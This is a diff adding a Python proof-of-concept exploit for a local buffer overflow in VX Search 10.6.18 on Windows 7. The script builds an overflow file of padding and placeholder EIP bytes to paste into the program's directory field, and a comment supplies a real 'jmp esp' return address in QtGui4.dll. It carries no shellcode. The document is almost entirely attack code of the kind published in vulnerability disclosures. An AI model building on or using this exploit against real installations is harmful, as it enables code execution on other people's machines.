@@ -1,0 +1,23 @@
+#!/usr/bin/python
+# Title: VX Search 10.6.18 Local Buffer Overflow
+# Author: Kevin McGuigan
+# Twitter: @_h3xagram
+# Author Website: https://www.7elements.co.uk
+# Vendor Website: http://www.vxsearch.com
+# Version: 10.6.18
+# Date: 18/04/2018
+# Tested on: Windows 7 32-bit
+# Vendor did not respond to advisory. 
+
+# Copy the contents of vxsearchpoc.txt, click the Server icon and paste into the directory field. 
+
+filename="vxsearchPOC.txt"
+junk = "A"*271
+#0x652c2a1a : "jmp esp" | asciiprint,ascii {PAGE_READONLY}[QtGui4.dll] ASLR: False, Rebase: False, SafeSEH: False, OS:False, v4.3.4.0 (C:\Program Files\VX SearchServer\bin\QtGui4.dll)
+#eip="\x1a\x2a\x2c\x65"
+eip = "B" * 4
+fill = "C" *900
+buffer = junk + eip + fill
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
